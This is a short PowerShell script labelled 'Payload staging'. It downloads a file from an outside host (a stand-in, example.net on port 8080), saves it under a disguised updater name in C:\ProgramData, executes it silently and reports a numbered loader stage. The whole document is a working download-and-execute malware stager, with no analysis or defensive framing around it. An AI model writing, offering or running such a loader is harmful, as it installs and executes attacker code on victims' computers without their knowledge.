<# Payload staging #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://example.net:8080/updater.ps1',
    [string]$LocalPath = 'C:\ProgramData\updater.exe'
)
try { (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $LocalPath); Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue; Write-Output "stage 5 initialized" } catch { Write-Warning "Loader step failed" }
